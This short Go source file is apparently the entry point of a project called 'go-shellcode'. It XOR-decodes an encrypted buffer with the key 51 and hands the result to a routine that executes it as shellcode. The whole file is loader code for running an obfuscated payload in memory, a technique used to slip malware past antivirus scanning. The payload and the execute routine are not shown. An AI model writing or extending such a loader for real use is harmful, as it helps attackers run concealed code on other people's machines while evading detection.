package main

import (
	"fmt"
	"go-shellcode/shellcode"
	"go-shellcode/utils"
)

func main() {
	if err := shellcode.Execute(utils.Xor(utils.EncBuf, 51)); err != nil {
		fmt.Println(err)
	}
}
